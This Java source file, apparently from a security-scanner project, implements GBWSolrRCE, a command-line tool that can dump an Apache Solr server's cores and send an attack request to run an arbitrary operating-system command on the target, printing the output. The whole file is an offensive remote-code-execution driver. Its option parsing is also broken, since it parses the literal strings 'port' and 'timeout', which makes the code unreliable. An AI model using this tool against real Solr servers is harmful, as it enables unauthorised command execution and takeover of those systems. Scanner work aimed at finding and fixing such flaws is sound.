package com.gbw.scanner.plugins.scripts.web.solr;

import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.utils.HttpUtils;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.GnuParser;
import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;

public class GBWSolrRCE {

    private static void dumpCores(CloseableHttpClient client, Host host, GBWScanSolrScriptConfig config){

        HttpUriRequest httpRequest = SolrHttpRequestBuilder.makeSolrCoreAdminRequest(host,config);
        GBWHttpResponse httpResponse = HttpUtils.send(client,httpRequest,true);

        System.out.println(httpResponse.getContent());
    }

    private static void runCmd(CloseableHttpClient client, Host host, GBWScanSolrScriptConfig config,String core){
        HttpUriRequest httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(host,config,core);
        GBWHttpResponse httpResponse = HttpUtils.send(client,httpRequest,true);

        System.out.println(httpResponse.getContent());
    }

    public static void main(String[] args) throws Exception {


        int port = 8983;
        int timeout = 10000;
        boolean encode = false;
        String core = "collection1";
        String host;
        GBWScanSolrScriptConfig config = new GBWScanSolrScriptConfig();

        Options opts = new Options();
        opts.addOption("host",true,"solr host");
        opts.addOption("port",true,"solr port");
        opts.addOption("cmd",true,"run rce cmd");
        opts.addOption("timeout",true,"connect/read timeout");
        opts.addOption("encode",false,"encode cmd or not by urlcode");
        opts.addOption("dump",false,"dump solr cores");
        opts.addOption("core",true,"solr core");
        opts.addOption("help", false, "Print usage");

        CommandLine cliParser = new GnuParser().parse(opts, args);
        if(cliParser.hasOption("help")){

            new HelpFormatter().printHelp("GBWSolrRCE", opts);
            System.exit(0);
        }

        if(!cliParser.hasOption("host")){

            System.out.println("Please specify solr host!");
            System.exit(-1);
        }

        host = cliParser.getOptionValue("host");
        if(cliParser.hasOption("port")){
            port = Integer.parseInt("port");
        }

        if(cliParser.hasOption("timeout"))
            timeout = Integer.parseInt("timeout");

        if(cliParser.hasOption("core"))
            core = cliParser.getOptionValue("core");

        if(cliParser.hasOption("encode"))
            encode = true;

        config.setConTimeout(timeout);
        config.setReadTimeout(timeout);
        config.setEncode(encode);

        CloseableHttpClient httpClient = GBWHttpClientBuilder.make("http",port);
        Host hhost = new Host(host,host,port,null,null);

        if(cliParser.hasOption("dump")){
            dumpCores(httpClient,hhost,config);
        }

        if(cliParser.hasOption("cmd")){

            config.setCmd(cliParser.getOptionValue("cmd"));
            runCmd(httpClient,hhost,config,core);
        }
    }

}
